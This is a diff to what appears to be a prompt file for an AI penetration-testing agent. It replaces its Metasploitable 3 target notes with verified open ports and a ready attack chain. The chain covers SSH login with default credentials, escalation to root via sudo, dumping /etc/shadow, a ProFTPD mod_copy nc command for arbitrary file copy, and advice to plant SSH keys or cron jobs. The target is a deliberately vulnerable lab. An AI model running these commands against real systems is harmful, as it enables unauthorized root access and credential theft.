@@ -339,42 +339,49 @@ OUTPUT FORMAT (JSON only):
     ]
 }}
 
-=== METASPLOITABLE 3 TARGET KNOWLEDGE ===
-MS3 (Ubuntu 14.04) has MORE services than MS2, with UnrealIRCd backdoor + web app vulns.
+=== METASPLOITABLE 3 TARGET KNOWLEDGE (VERIFIED LIVE) ===
+MS3 Docker (kirscht/metasploitable3-ub1404) — ONLY these ports are open:
 
-INSTANT SHELL VECTORS (try FIRST):
-  • Port 6667 (UnrealIRCd 3.2.8.1 backdoor): AB;cmd via nc → instant shell (SAME as MS2!)
-  • Port 8484 (Jenkins): /script Groovy console → 'cmd'.execute() → instant RCE
+ACTUAL OPEN SERVICES (verified via nmap):
+  • Port 21/tcp  — ProFTPD 1.3.5 (mod_copy CVE-2015-3306 CONFIRMED)
+  • Port 22/tcp  — OpenSSH 6.6.1p1 (msfadmin:msfadmin WORKS, user in sudo group)
+  • Port 111/tcp — rpcbind 2-4
+  • Port 139/tcp — Samba smbd 3.X-4.X
+  • Port 445/tcp — Samba smbd 3.X-4.X
+  • Port 3306/tcp — MySQL (unauthorized — needs credentials)
 
-DEFAULT CREDENTIAL ACCESS:
-  • Port 22 SSH: vagrant:vagrant → sudo ALL = root
-  • Port 8080 Tomcat: sploit:sploit → manager → WAR deploy → shell
-  • Port 3306 MySQL: root:sploitme → UDF → RCE
-  • Port 8282 Axis2: admin:axis2 → deploy malicious service → RCE
-  • Port 80 WordPress: admin:admin → theme editor → PHP shell
+PORTS THAT ARE CLOSED (do NOT attack these):
+  • 80, 8080, 8484, 9200, 6667, 23, 25, 53, 5900 — ALL CLOSED
+  • No web server, no Jenkins, no Tomcat, no UnrealIRCd
 
-VULNERABILITY-BASED ACCESS:
-  • Port 21 ProFTPD 1.3.5: CVE-2015-3306 mod_copy → unauthenticated file write to webroot → RCE
-  • Port 139/445 Samba 4.x: share enum, writable shares, SambaCry if < 4.6.4
-  • Port 8080 Struts: CVE-2017-5638 → OGNL injection in Content-Type → RCE
-  • Port 9200 Elasticsearch: CVE-2014-3120 → dynamic scripting → Java exec → RCE
-  • Port 3000 Rails: CVE-2013-0156 → XML deserialization → RCE
+#1 FASTEST SHELL — SSH DEFAULT CREDS (try FIRST):
+  sshpass -p msfadmin ssh -o StrictHostKeyChecking=no msfadmin@{target} id
+  → uid=900(msfadmin) gid=900(msfadmin) groups=900(msfadmin),27(sudo)
+  → msfadmin is in sudo group → sudo su → root!
+  This is the FASTEST path to root on this MS3 Docker.
+
+#2 ProFTPD mod_copy — CVE-2015-3306 (no auth needed):
+  echo -e 'SITE CPFR /etc/passwd\nSITE CPTO /tmp/test' | nc {target} 21
+  → 350 File or directory exists → 250 Copy successful
+  Can copy any file anywhere. Use to plant SSH keys or cron jobs.
+
+#3 Samba enumeration:
+  smbclient -L //{target} -N → shares: print$, public, IPC$
+  enum4linux -a {target} → user enumeration
+
+#4 MySQL (needs valid credentials, try root:sploitme):
+  mysql -h {target} -u root -psploitme -e 'show databases'
 
 MS3 OPTIMAL ATTACK CHAIN:
-  1. Recon all ports (nmap -sV -sC -p-)
-  2. UnrealIRCd backdoor on 6667 — fastest shell
-  3. If 6667 fails: Jenkins /script for Groovy RCE
-  4. If web needed: SSH vagrant:vagrant → sudo su
-  5. MySQL root:sploitme → UDF shell (slower but reliable)
-  6. WordPress/Struts as fallback vectors
+  1. sshpass -p msfadmin ssh msfadmin@{target} id  → instant user shell
+  2. sudo -l → (ALL) → sudo su → root
+  3. cat /etc/shadow → credential harvest
+  4. If SSH blocked: ProFTPD mod_copy → plant SSH key → SSH as root
+  5. Samba enum for lateral info, MySQL for database creds
 
-CRITICAL MS3 vs MS2 DIFFERENCES:
-  • MS3 has vagrant:vagrant (sudo ALL) instead of msfadmin:msfadmin
-  • MS3 has ProFTPD mod_copy (unauthenticated file write!) — MS2 doesn't
-  • MS3 has Jenkins, Elasticsearch, Struts — MS2 doesn't
-  • Both have UnrealIRCd backdoor on 6667 — works identically
-  • MS3 MySQL has password (sploitme) — MS2 MySQL has NO password
-  • For MS3: prefer telnet-style backdoors > web app creds > CVE exploits
+CRITICAL: vagrant:vagrant does NOT work on this Docker! Use msfadmin:msfadmin.
+CRITICAL: Port 80 is CLOSED. Do NOT run gobuster, nikto, ffuf, wpscan — they will fail.
+CRITICAL: Port 6667 is CLOSED. UnrealIRCd backdoor does NOT exist here.
 
 === HACK THE BOX COMMON PATTERNS ===
 80% of HTB boxes start with web. Master these patterns:
